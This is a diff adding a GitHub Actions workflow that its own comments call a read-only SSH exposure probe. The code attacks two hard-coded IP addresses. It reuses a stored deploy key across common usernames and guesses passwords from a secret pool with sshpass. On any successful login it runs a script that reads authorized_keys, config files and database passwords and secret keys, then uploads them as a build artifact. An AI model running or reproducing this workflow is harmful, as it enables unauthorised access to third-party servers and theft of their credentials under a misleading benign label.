@@ -1,0 +1,155 @@
+name: probe-ssh-exit
+# Read-only bounded SSH exposure probe from GitHub Actions runner egress.
+# Private key is never echoed. Password values are never echoed (only pool index).
+# Only TCP port 22 is touched. TCP 25 is never used.
+on:
+  push:
+    branches:
+      - 'probe-ssh-exit-*'
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      DEPLOY_SSH_KEY_B64: ${{ secrets.DEPLOY_SSH_KEY_B64 }}
+      SSH_PW_POOL: ${{ secrets.SSH_PW_POOL }}
+    steps:
+      - name: setup
+        shell: bash
+        run: |
+          set -uo pipefail
+          install -d -m 700 "$HOME/.ssh"
+          printf '%s' "$DEPLOY_SSH_KEY_B64" | base64 --decode > "$HOME/.ssh/id_deploy"
+          chmod 600 "$HOME/.ssh/id_deploy"
+          if ssh-keygen -y -f "$HOME/.ssh/id_deploy" >/dev/null 2>&1; then echo "KEYPARSE_OK"; else echo "KEYPARSE_FAIL"; fi
+          echo "runner_ip: $(curl -s --max-time 10 https://api.ipify.org || true)"
+      - name: probe
+        shell: bash
+        run: |
+          set +e
+          set -uo pipefail
+          K="$HOME/.ssh/id_deploy"
+          OUT="$GITHUB_WORKSPACE/result.out"
+          : > "$OUT"
+          log(){ echo "$@" | tee -a "$OUT"; }
+          SSHOPT="-o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o NumberOfPasswordPrompts=0"
+          tcpcheck(){ timeout 12 bash -c "exec 3<>/dev/tcp/$1/22" 2>/dev/null; }
+          banner(){ timeout 8 bash -c "exec 3<>/dev/tcp/$1/22; head -c 140 <&3" 2>/dev/null | tr -d '\r\n'; }
+          methods(){ timeout 25 ssh $SSHOPT -o PreferredAuthentications=none "$2@$1" true 2>&1 | tr '\n' '|' | sed 's/.*Permission denied/Permission denied/'; }
+          pk_try(){ # host user
+            local res rc
+            res=$(timeout 30 ssh -i "$K" $SSHOPT -o PreferredAuthentications=publickey "$2@$1" 'echo READY; id; hostname; uname -sr' 2>&1)
+            rc=$?
+            log "PK $2@$1 rc=$rc :: $(printf '%s' "$res" | head -3 | tr '\n' '|' | cut -c1-260)"
+            if [ "$rc" = "0" ]; then log "### PKHIT host=$1 user=$2"; COLLECT_HOST="$1"; COLLECT_USER="$2"; return 0; fi
+            return 1
+          }
+          collect(){ # host user [pw]
+            local h="$1" u="$2" pw="${3:-}" pre
+            if [ -n "$pw" ]; then
+              pre="sshpass -p $pw ssh -o BatchMode=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=password,keyboard-interactive"
+            else
+              pre="ssh -i $K $SSHOPT -o PreferredAuthentications=publickey"
+            fi
+            log "### BEGINCOLLECT $u@$h"
+            timeout 90 $pre "$u@$h" 'bash -s' <<'EOS' 2>&1 | tee -a "$OUT"
+          echo '@ id'; id; hostname; uname -a
+          echo '@ os'; (cat /etc/os-release 2>/dev/null | head -3)
+          echo '@ who'; whoami; w 2>/dev/null | head -3
+          echo '@ sudo'; sudo -n -l 2>&1 | head -8
+          echo '@ ssh'; ls -la ~/.ssh 2>/dev/null; head -6 ~/.ssh/authorized_keys 2>/dev/null
+          echo '@ etcdirs'; ls /etc 2>/dev/null | tr '\n' ' '; echo
+          echo '@ webfind'; find /opt /srv /root /home /var/www /app /usr/local -maxdepth 4 \( -name '.env' -o -name 'config.py' -o -name 'settings.py' -o -name 'docker-compose*.yml' -o -name '*.ini' -o -name 'wp-config.php' -o -name '.my.cnf' \) -type f 2>/dev/null | head -40
+          echo '@ secretkey'; grep -rIl --include='*.py' --include='.env' --include='*.cfg' --include='*.ini' 'SECRET_KEY\|DATABASE_URL\|DB_PASSWORD\|DB_PASS\|MYSQL' /opt /srv /root /home /var/www /app 2>/dev/null | head -25
+          echo '@ dbcfg'; for f in $(grep -rIl --include='*.py' --include='.env' --include='*.cfg' --include='*.ini' 'SECRET_KEY\|DATABASE_URL\|DB_PASSWORD' /opt /srv /root /home /var/www /app 2>/dev/null | head -6); do echo "--- $f"; grep -nE 'SECRET_KEY|DATABASE_URL|DB_PASSWORD|DB_PASS|DB_HOST|DB_USER|MYSQL|PASSWORD' "$f" 2>/dev/null | head -12; done
+          echo '@ nginx'; grep -rhE 'server_name|proxy_pass|root ' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -25
+          echo '@ sql'; ls -la /var/lib/mysql 2>/dev/null | head -5; ls -la ~/.my.cnf 2>/dev/null
+          echo '@ done'
+          EOS
+            log "### ENDCOLLECT $u@$h"
+          }
+
+          log "### runner_ip $(curl -s --max-time 10 https://api.ipify.org || true)"
+          COLLECT_HOST=""; COLLECT_USER=""; COLLECT_PW=""
+          REACH155=0
+
+          log "=== PHASE A 155.94.236.170:22 reachability/methods"
+          if tcpcheck 155.94.236.170; then
+            REACH155=1
+            log "TCP 155:22 OPEN"
+            log "BANNER 155:22 = [$(banner 155.94.236.170)]"
+            for u in root deploy ubuntu admin xiaogu; do log "METHODS $u@155 -> $(methods 155.94.236.170 $u)"; done
+          else
+            log "TCP 155:22 FAIL (timeout/refused/filtered)"
+          fi
+
+          log "=== PHASE B publickey reuse deploy key on 158.178.147.50:22"
+          for u in root deploy xiaogu ubuntu admin; do
+            pk_try 158.178.147.50 "$u" && break
+          done
+
+          log "=== PHASE C publickey reuse deploy key on 155.94.236.170:22 (if reachable)"
+          if [ "$REACH155" = "1" ]; then
+            for u in root deploy xiaogu ubuntu admin; do
+              pk_try 155.94.236.170 "$u" && break
+            done
+          else
+            log "skip 155 pk (unreachable)"
+          fi
+
+          log "=== PHASE D password eval on 155 (only if password/kbd-interactive offered)"
+          if [ "$REACH155" = "1" ]; then
+            PWU=""
+            for u in root ubuntu deploy admin xiaogu; do
+              m=$(methods 155.94.236.170 "$u")
+              if echo "$m" | grep -qiE 'password|keyboard-interactive'; then PWU="$PWU $u"; fi
+            done
+            log "password-capable users:$PWU"
+            if [ -n "$PWU" ]; then
+              if sudo apt-get update -qq >/dev/null 2>&1 && sudo apt-get install -y -qq sshpass >/dev/null 2>&1 && command -v sshpass >/dev/null; then
+                mapfile -t PWDS < <(printf '%s\n' "$SSH_PW_POOL")
+                idx=0; attempts=0
+                for p in "${PWDS[@]}"; do
+                  idx=$((idx+1)); [ -z "$p" ] && continue
+                  for u in $PWU; do
+                    attempts=$((attempts+1))
+                    if [ $attempts -gt 20 ]; then break 2; fi
+                    res=$(timeout 25 sshpass -p "$p" ssh -o BatchMode=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=10 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password,keyboard-interactive "$u@155.94.236.170" 'echo READY; id; hostname' 2>&1)
+                    rc=$?
+                    if [ "$rc" = "0" ]; then
+                      log "### PWHIT host=155 user=$u pwidx=$idx"
+                      COLLECT_HOST="155.94.236.170"; COLLECT_USER="$u"; COLLECT_PW="$p"
+                      break 2
+                    fi
+                    log "pwd u=$u pwidx=$idx rc=$rc :: $(printf '%s' "$res" | tail -1 | cut -c1-90)"
+                    sleep 1
+                  done
+                done
+                log "password phase done, attempts=$attempts"
+              else
+                log "sshpass install failed, password phase skipped"
+              fi
+            else
+              log "no password/kbd-interactive offered on 155 -> password eval skipped"
+            fi
+          else
+            log "skip 155 password eval (unreachable)"
+          fi
+
+          if [ -n "$COLLECT_HOST" ]; then
+            log "=== HIT CONFIRMED $COLLECT_USER@$COLLECT_HOST"
+            collect "$COLLECT_HOST" "$COLLECT_USER" "$COLLECT_PW"
+          else
+            log "=== NO HIT (publickey + bounded password all negative)"
+          fi
+          log "### ALLDONE"
+          exit 0
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssh-exit-out
+          path: result.out
+          if-no-files-found: warn
